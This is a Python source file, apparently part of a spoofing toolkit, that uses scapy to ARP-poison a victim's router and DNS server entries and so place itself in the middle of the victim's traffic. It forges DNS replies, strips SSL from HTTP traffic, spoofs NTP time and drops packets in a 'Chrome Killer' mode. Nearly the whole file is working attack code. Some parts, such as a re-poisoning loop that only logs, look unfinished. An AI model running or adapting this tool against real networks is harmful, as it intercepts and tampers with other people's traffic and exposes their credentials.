import sys
from scapy.all import Ether,conf, get_if_addr,get_if_hwaddr,sendp,sniff,IP,DNS,Raw,DNSQR,NTP
from time import sleep
import signal 
import threading
import spoofing.utils.arp_util as arp_util
import spoofing.utils.dns_local as dns_local
from spoofing.objects.http_ex  import HTTP
from  utils.printing import Printing
from spoofing.spoofers import ntp_spoof  , dns_spoof,http_spoofer
from spoofing.utils import utils 
from spoofing.urlspoof.spoofer import isSpoofed 
import traceback


    
def validateDNS(packet:DNS)->bool: 
    ''' checks if the packet is a valid DNS packet for spoofing '''
  
    try: 
        name : str  = packet[DNSQR].qname.decode()[:-1]
        return DNSQR in packet and packet[DNSQR].qname.decode().removeprefix('https://').startswith("vvvvvv.")
    except: 
        ...
    if DNSQR in packet : 
        Printing.printError(name)
    return False  

def validateHttp(rawp:bytes)->bool:
    ''' check if the packet is an HTTP packet '''
    VALIDHTTP=b"HTTP"
    try : 
        return rawp.startswith(VALIDHTTP)
    except : 
        return False 
      
def chromeExploitBanner(): 
    Printing.printWarning("🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯")
    Printing.printWarning("🤯Chrome Killer in action broooo🤯")
    Printing.printWarning("🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯🤯")

def throworkill(packet:Ether,routerMac:str , victimMac:str ,spoofedIp :str ,  interface:str , finishChrome : bool )-> None:
    ''' if the packet is matching to any kind of spoofing it is spoofing it other wise it just doing ip forwarding  '''
    global ntpSpoofed
    try:
        # IP forwarding 
        packet[Ether].src = routerMac
        packet[Ether].dst = victimMac
        #DNS spoofing
        valid  =  validateDNS(packet)
        if DNS in packet and valid : 
            Printing.printSuccess(f"poisining :  {packet[DNS].qd.qname} !")
            packet = utils.udpCopy(packet, sourceMac=routerMac , dstMac=  victimMac) / dns_spoof.dns_spoof(packet=packet,spoofedIp=spoofedIp)
        #HTTP spoofing - Chronium Exploit 
        elif Raw in packet and validateHttp(packet[Raw].load) : 
            httpPack = HTTP.fromRawPack(packet[Raw].load,packet[IP].src)
            httpPack.timeTravel()
            if  finishChrome and  httpPack and httpPack.chromeKillerAvailable() : 
                Printing.printWarning(httpPack)
                chromeExploitBanner()
                return  #drop packet 
            elif httpPack and httpPack.sslStripavailable() : 
                Printing.printSuccess("...Catched SSL STRIPING...")
                http_spoofer.http_spoof(httpPack)
                Printing.printSuccess(httpPack)
            else : 
                Printing.printNotes(httpPack)
            packet = utils.tcpCopy(packet, sourceMac=routerMac , dstMac=  victimMac )/Raw(httpPack.toRaw())
       # NTP Spoofing 
        elif NTP in packet : 
            Printing.printSuccess("ntp spoofing")
            packet = utils.udpCopy(packet, sourceMac=routerMac , dstMac=  victimMac )/ntp_spoof.ntp_spoof(packet= packet)  
            ntpSpoofed = True 
        
        # forward the packet 
        sendp(packet,iface=interface,verbose=False) 
    except Exception as e : 
        Printing.printError(traceback.format_exc())

def HttpDnsSpoofer(victim : str , interface : str , finishChrome : bool )->None:
    ''' gather all the data and start the threads for the spoofing '''
             
    attackData = { 
        "victim": None ,  
        "victimmac":None ,  
        "targetMac" : None,
        "routerMac" : None,
        "mac ":None , #my mac
        "ip" : None , #my ip , 
        "dnsServer" : None , 
        "dnsServerMac" : None ,
        "finishchrome" : None 
    } 
   
    def sniffTraffic():
        Printing.printNotes("sniff is started")
        sniff(lfilter= lambda x : IP in x and x[IP].dst == attackData["victim"] , prn = lambda packet : throworkill(packet, attackData["routerMac"], attackData["victimmac"], attackData["ip"],attackData["interface"], attackData["finishchrome"]) )
        Printing.printNotes("sniff is done ")
    def dispose(*args): 
        ''' changes the arp table to the first value '''
        print("dispoe")
        arp_util.changeArpTable(attackData["router"], attackData["routerMac"], attackData["victim"] , attackData["victimmac"],attackData["interface"] )
        arp_util.changeArpTable(attackData["dnsServer"], attackData["dnsServerMac"], attackData["victim"] , attackData["victimmac"],attackData["interface"] )
        sys.exit(0)
      
    def arpSpoofing():
        ''' arp spoofing to create MITM '''
        Printing.printNotes("arp spoofing is started")
        arp_util.changeArpTable(attackData["router"], attackData["routerMac"], attackData["victim"] , attackData["mac"],attackData["interface"] )
        arp_util.changeArpTable(attackData["dnsServer"], attackData["dnsServerMac"], attackData["victim"] , attackData["mac"],attackData["interface"] )
        
    def redoit():
        ''' arp spoofing mainting '''
        while(True):
            Printing.printLog(f'arp spoofing of {attackData["mac"]} on {attackData["routerMac"]} ')
            sleep(45)
   
    #### attackData #### - gather all the neccersy data
    attackData["victim"]=victim
    attackData["interface"]=interface
    attackData["victimmac"]=arp_util.getTargetMac(attackData["victim"], attackData["interface"])
    attackData["router"] = next(filter(lambda x : x[3] == attackData["interface"] , dict(conf.route.__dict__)["routes"]))[2]
    attackData["routerMac"] = arp_util.getTargetMac(attackData["router"], attackData["interface"])
    attackData["mac"]=get_if_hwaddr(attackData["interface"])
    attackData["ip"]= get_if_addr(attackData["interface"])
    attackData["dnsServer"] = dns_local.get_dns_local_server()
    attackData["dnsServerMac"] = arp_util.getTargetMac(attackData["dnsServer"], attackData["interface"])
    attackData["finishchrome"] = finishChrome
    #### attackData ####
    arpSpoofing()
    arpSpoofer = threading.Thread(target=redoit)
    sniffer = threading.Thread(target=sniffTraffic)
    sniffer.start()
    arpSpoofer.start()
    
    signal.signal(signal.SIGINT, dispose)
    Printing.printLog(attackData)
    sniffer.join()
    arpSpoofer.join()
    Printing.printNotes("arp spoofing is done ")
    signal.pause()
    dispose()
